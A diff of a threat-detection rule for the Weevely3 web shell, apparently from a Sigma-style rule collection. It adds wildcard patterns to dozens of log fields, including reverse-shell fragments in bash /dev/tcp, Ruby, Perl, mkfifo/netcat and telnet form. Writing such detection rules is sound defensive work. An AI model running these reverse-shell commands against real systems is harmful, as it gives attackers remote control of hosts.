@@ -6,188 +6,1250 @@ references:
 - https://github.com/epinna/weevely3
 author: '@mthcht'
 date: 2023/07/30
-modified: 2024/08/31
+modified: 2024/10/24
 tags:
-- attack.T1056
-- attack.T1059
-- attack.T1071
+- attack.T1059.003
+- attack.T1071.001
+- attack.T1078
 - attack.T1100
-- attack.T1102
+- attack.T1219
 - attack.TA0002
 - attack.TA0003
+- attack.TA0005
+- attack.TA0008
+- attack.TA0011
 logsource:
   category:
   - endpoint
+  - network
 detection:
   selection:
   - Image:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - OriginalFileName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - CurrentDirectory:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ParentImage:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ParentCommandLine:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - TargetFilename:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Signature:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - signature:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ImageLoaded:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Company:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Description:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - description:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - CommandLine:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - SourceImage:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - TargetImage:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - CallTrace:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - TargetObject:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Details:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - PipeName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Consumer:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Destination:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Query:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - NewName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - StartAddress:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - StartModule:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - StartFunction:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - SourceHostname:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Device:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - file_name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - file_path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - original_file_name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - parent_process:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - process_path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - service_path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - registry_path:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - registry_value_data:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - registry_value_name:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ContextInfo:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - Payload:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ScriptBlockText:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
+    - '*ruby -rsocket -e''f=TCPSocket.open("${lhost}",${port}).to_i*'
+    - '*epinna/weevely3*'
+    - '*perl -e ''use Socket;$i="${lhost}";$p=${port}*'
+    - '*weevely generate *'
+    - '*rm -rf /tmp/backpipe;mknod /tmp/backpipe p;telnet * 0</tmp/backpipe*'
+    - '*sleep 1; rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost}
+      ${port} >/tmp/f*'
   - ServerName:
-    - '*/Weevely3*'
+    - '*/weevely.py*'
+    - '*sleep 1; /bin/bash -c \''${shell} 0</dev/tcp/${lhost}/${port} 1>&0 2>&0*'
+    - '*/reversetcp.py*'
